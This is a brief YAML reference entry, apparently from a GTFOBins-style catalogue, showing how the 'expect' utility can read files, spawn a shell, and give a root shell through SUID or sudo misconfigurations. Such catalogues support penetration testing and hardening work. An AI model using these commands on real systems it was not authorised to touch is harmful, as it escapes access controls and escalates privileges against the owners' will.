---
functions:
  file-read:
    - description: read only first line of file.
      code: |
        LFILE=file_to_read
        expect $LFILE
  shell:
    - code: expect -c 'spawn /bin/sh;interact'
  suid:
    - code: ./expect -c 'spawn /bin/sh -p;interact'
  sudo:
    - code: sudo expect -c 'spawn /bin/sh;interact'
---
